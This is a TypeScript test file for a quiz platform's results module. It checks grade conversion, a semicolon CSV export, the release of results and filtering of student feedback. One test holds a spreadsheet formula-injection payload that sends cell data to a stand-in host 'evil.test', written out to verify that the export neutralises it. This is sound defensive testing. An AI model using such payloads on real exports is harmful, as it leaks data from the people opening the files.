/**
 * Results, CSV and student feedback against the real migrations (PLAN-MVP §8,
 * WP6).
 *
 * The grade table is checked against the fixtures of §7.1 through the WHOLE
 * chain — points in `gradings`, scale in `evaluations.grading_scale`,
 * conversion in `@quiz/domain` — rather than against `gradeFromPoints` alone,
 * which `packages/domain` already covers.
 */
import { eq } from "drizzle-orm";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import type { CodeDetails } from "@quiz/qt-code/server";
import { registerForTests } from "@quiz/registry/server";

import type { Db } from "../../db/client.js";
import { evaluationItems, evaluations } from "../../db/schema.js";
import { testApp, testDb, type TestDb } from "../../test/db.js";
import { fakeShort } from "../../test/fakeType.js";
import { reload, seedLive } from "../../test/live.js";
import { applyState, isLegalTransition, joinedItems } from "../evaluation/service.js";
import * as grading from "../grading/service.js";
import * as live from "../live/service.js";
import { BOM, csvField, resultsCsv } from "./csv.js";
import * as service from "./service.js";

let raw: TestDb;
let db: Db;
let restore: () => void;

beforeAll(async () => {
  restore = registerForTests(fakeShort);
  raw = await testDb();
  db = raw as unknown as Db;
});
afterAll(() => restore());

async function appFor() {
  const app = await testApp(raw);
  app.clock.set("2026-09-20T09:00:00.000Z");
  return app;
}

/**
 * A closed evaluation worth `total` points spread over one item, with two
 * students: the first has an attempt, the second never showed up.
 */
async function evaluationWorth(total: number) {
  const app = await appFor();
  const seed = await seedLive(db, { students: 2, questions: 1 });
  let evaluation = await applyState(db, await reload(db, seed.evaluationId), "running", app.clock.now());
  const items = await joinedItems(db, evaluation.id);
  await db
    .update(evaluationItems)
    .set({ points: total })
    .where(eq(evaluationItems.id, items[0]!.item.id));

  const participant = (await live.participantOf(db, evaluation, seed.studentIds[0]!))!;
  const created = await live.ensureAttempt(db, evaluation, participant, app.clock.now());
  const attempt = await live.beginAttempt(db, evaluation, created, participant, app.clock.now());
  evaluation = await live.closeEvaluation(db, evaluation, app.clock.now());
  return { app, seed, evaluation, itemId: items[0]!.item.id, attempt };
}

/** Puts exactly `points` on the single item of the evaluation. */
async function award(
  app: Awaited<ReturnType<typeof appFor>>,
  built: Awaited<ReturnType<typeof evaluationWorth>>,
  points: number,
  details: unknown = { manual: true },
) {
  await grading.writeGrading(db, {
    attemptId: built.attempt.id,
    itemId: built.itemId,
    answerId: null,
    points,
    maxPoints: (await joinedItems(db, built.evaluation.id))[0]!.item.points,
    source: "manual",
    state: "validated",
    details,
    comment: "teacher note",
    now: app.clock.now(),
  });
}

describe("the grade table (§7.1, F-RES-01)", () => {
  it("converts points to the Swiss scale, linear and threshold", async () => {
    const built = await evaluationWorth(20);
    await award(built.app, built, 12);

    const linear = await service.resultsView(db, await reload(db, built.evaluation.id));
    expect(linear.totalPoints).toBe(20);
    expect(linear.rows.find((r) => r.attemptId !== null)!.grade).toBe(4);

    await db
      .update(evaluations)
      .set({ gradingScale: { kind: "threshold", threshold: 18, rounding: "nearest" } })
      .where(eq(evaluations.id, built.evaluation.id));
    const threshold = await service.resultsView(db, await reload(db, built.evaluation.id));
    // 12 / 18 -> 1 + 5 * 0.666… = 4.3
    expect(threshold.rows.find((r) => r.attemptId !== null)!.grade).toBe(4.3);
  });

  it("gives the absent student a row, zero points and a 1.0", async () => {
    const built = await evaluationWorth(20);
    await award(built.app, built, 20);

    const view = await service.resultsView(db, await reload(db, built.evaluation.id));
    expect(view.rows).toHaveLength(2);
    const absent = view.rows.find((r) => r.attemptId === null)!;
    expect(absent.state).toBe("absent");
    expect(absent.points).toBe(0);
    expect(absent.grade).toBe(1);
    expect(view.rows.find((r) => r.attemptId !== null)!.grade).toBe(6);
    // Both rows count in the statistics.
    expect(view.stats.count).toBe(2);
    expect(view.stats.min).toBe(1);
    expect(view.stats.max).toBe(6);
    expect(view.stats.histogram.at(-1)).toEqual({ bucket: 6, count: 1 });
  });
});

describe("the CSV export (F-RES-02)", () => {
  it("starts with a UTF-8 BOM, separates with ';' and carries every student", async () => {
    const built = await evaluationWorth(20);
    await award(built.app, built, 12);
    const view = await service.resultsView(db, await reload(db, built.evaluation.id));
    const csv = resultsCsv(view);

    const bytes = Buffer.from(csv, "utf8");
    expect([bytes[0], bytes[1], bytes[2]]).toEqual([0xef, 0xbb, 0xbf]);
    expect(csv.startsWith(BOM)).toBe(true);

    const lines = csv.slice(BOM.length).trimEnd().split("\r\n");
    expect(lines[0]!.split(";").slice(0, 3)).toEqual(["email", "last_name", "first_name"]);
    expect(lines[0]!.endsWith(";total;grade")).toBe(true);
    // Header, plus one row per student — the absent one included.
    expect(lines).toHaveLength(3);
    expect(lines.some((l) => l.endsWith(";12;4.0"))).toBe(true);
    expect(lines.some((l) => l.endsWith(";;0;1.0"))).toBe(true);
    expect(csv.includes(",")).toBe(false);
  });

  /**
   * Finding M2: names and emails come from the roster import and from the
   * identity provider's claims, and the file is opened in Excel by the
   * teacher. Quoting does not stop a formula from running; the prefix does.
   */
  it("neutralises a field a spreadsheet would run as a formula", () => {
    // The prefix first, then the RFC-4180 quoting of the quotes it contains.
    expect(csvField('=HYPERLINK("http://evil.test?"&A1)')).toBe(
      `"'=HYPERLINK(""http://evil.test?""&A1)"`,
    );
    expect(csvField("+1 41 79")).toBe("'+1 41 79");
    expect(csvField("-2")).toBe("'-2");
    expect(csvField("@user")).toBe("'@user");
    expect(csvField("\tlead")).toBe("'\tlead");
    // …and a field that needs quoting is still quoted, prefix included.
    expect(csvField('=a;b"c')).toBe(`"'=a;b""c"`);
    // An ordinary field is untouched: the export stays diff-readable.
    expect(csvField("Dupond")).toBe("Dupond");
  });
});

describe("release (F-RES-04, F-GRADE-09)", () => {
  it("freezes the grades once and stays idempotent", async () => {
    const built = await evaluationWorth(20);
    await award(built.app, built, 10);

    const first = await service.releaseResults(
      db,
      await reload(db, built.evaluation.id),
      built.app.clock.now(),
    );
    const stored = await reload(db, built.evaluation.id);
    expect(stored.state).toBe("released");
    expect(stored.releasedGrades).toMatchObject({ totalPoints: 20 });

    built.app.clock.advance(3_600_000);
    const second = await service.releaseResults(
      db,
      stored,
      built.app.clock.now(),
    );
    // The date the students were told about does not move.
    expect(second.releasedAt.toISOString()).toBe(first.releasedAt.toISOString());
    expect(second.rows).toBe(first.rows);

    await service.unreleaseResults(db, await reload(db, built.evaluation.id), built.app.clock.now());
    const withdrawn = await reload(db, built.evaluation.id);
    expect(withdrawn.releasedAt).toBeNull();
    expect(withdrawn.releasedGrades).toBeNull();
    expect(withdrawn.state).toBe("closed");
    // Finding L7: the withdrawal goes through the state table like every
    // other move, instead of writing `closed` behind its back.
    expect(isLegalTransition("released", "closed")).toBe(true);
  });

  it("refuses to release an evaluation that is still running", async () => {
    const app = await appFor();
    const seed = await seedLive(db, { students: 1, questions: 1 });
    const running = await applyState(db, await reload(db, seed.evaluationId), "running", app.clock.now());
    await expect(service.releaseResults(db, running, app.clock.now())).rejects.toThrow(
      service.NotReleasable,
    );
  });
});

describe("student feedback (F-RES-04, docs/05 §5.7)", () => {
  it("shows nothing at all before the release", async () => {
    const built = await evaluationWorth(20);
    await award(built.app, built, 20);
    const attempt = (await live.attemptById(db, built.attempt.id))!;

    const before = await service.studentFeedback(
      db,
      await reload(db, built.evaluation.id),
      attempt,
    );
    expect(before).toEqual({
      available: false,
      reason: "results_pending",
      evaluation: { id: built.evaluation.id, title: built.evaluation.title },
    });
    // No question content, no points, no key: the payload is three fields.
    expect(JSON.stringify(before)).not.toContain("answer-q0");
  });

  it("applies the policy field by field once released", async () => {
    const built = await evaluationWorth(20);
    await award(built.app, built, 20);
    await service.releaseResults(db, await reload(db, built.evaluation.id), built.app.clock.now());
    const attempt = (await live.attemptById(db, built.attempt.id))!;

    // The default policy: the answer yes, the key no, no explanation.
    const closed = await service.studentFeedback(
      db,
      await reload(db, built.evaluation.id),
      attempt,
    );
    expect(closed.available).toBe(true);
    if (!closed.available) throw new Error("unreachable");
    expect(closed.grade).toBe(6);
    expect(closed.points).toBe(20);
    expect(closed.items[0]!.solution).toBeNull();
    expect(closed.items[0]!.explanation).toBeNull();
    expect(closed.items[0]!.comment).toBe("teacher note");
    expect(JSON.stringify(closed)).not.toContain("answer-q0");

    await db
      .update(evaluations)
      .set({
        feedbackPolicy: {
          when: "on_release",
          showAnswer: true,
          showKey: true,
          showExplanation: true,
          showHiddenCaseNames: true,
          showTeacherComment: false,
        },
      })
      .where(eq(evaluations.id, built.evaluation.id));
    const open = await service.studentFeedback(db, await reload(db, built.evaluation.id), attempt);
    if (!open.available) throw new Error("unreachable");
    expect(open.items[0]!.solution).toMatchObject({ answer: "answer-q0" });
    expect(open.items[0]!.comment).toBeNull();

    await db
      .update(evaluations)
      .set({
        feedbackPolicy: {
          when: "none",
          showAnswer: true,
          showKey: true,
          showExplanation: true,
          showHiddenCaseNames: true,
          showTeacherComment: true,
        },
      })
      .where(eq(evaluations.id, built.evaluation.id));
    const silent = await service.studentFeedback(
      db,
      await reload(db, built.evaluation.id),
      attempt,
    );
    expect(silent).toMatchObject({ available: false, reason: "no_feedback" });
  });
});

describe("the details filter for `code` (decision D15, deviation W3-5)", () => {
  const details: CodeDetails = {
    runner: "ok",
    compile: { ok: true, stderr: "", ms: 1 },
    cases: [
      {
        name: "visible-1",
        visible: true,
        points: 1,
        ok: true,
        exitCode: 0,
        ms: 1,
        timedOut: false,
        oom: false,
        expected: "42",
        actual: "42",
      },
      {
        name: "hidden-overflow",
        visible: false,
        points: 1,
        ok: false,
        exitCode: 1,
        ms: 2,
        timedOut: false,
        oom: false,
        expected: "SECRET-EXPECTED",
        actual: "SECRET-ACTUAL",
        stderr: "SECRET-STDERR",
      },
    ],
    earned: 1,
    total: 2,
    sourceSha256: "a".repeat(64),
  };

  const policy = (over: Partial<Record<string, boolean | string>> = {}) => ({
    when: "on_release" as const,
    showAnswer: true,
    showKey: false,
    showExplanation: false,
    showHiddenCaseNames: false,
    showTeacherComment: true,
    ...over,
  });

  it("strips the hidden case bodies and the name when the policy says so", () => {
    const filtered = service.filterDetails("code", details, policy());
    const json = JSON.stringify(filtered);
    expect(json).not.toContain("SECRET-EXPECTED");
    expect(json).not.toContain("SECRET-ACTUAL");
    expect(json).not.toContain("SECRET-STDERR");
    expect(json).not.toContain("hidden-overflow");
    // The verdict and the points survive: the student must still be able to
    // reason about the scale (decision D15).
    expect(json).toContain('"ok":false');
    expect(json).toContain("visible-1");
  });

  it("keeps the hidden NAMES when `showHiddenCaseNames` is on", () => {
    const named = JSON.stringify(
      service.filterDetails("code", details, policy({ showHiddenCaseNames: true })),
    );
    expect(named).toContain("hidden-overflow");
    expect(named).not.toContain("SECRET-EXPECTED");
  });

  it("publishes everything when the teacher published the key", () => {
    const whole = JSON.stringify(
      service.filterDetails("code", details, policy({ showKey: true })),
    );
    expect(whole).toContain("SECRET-EXPECTED");
  });
});
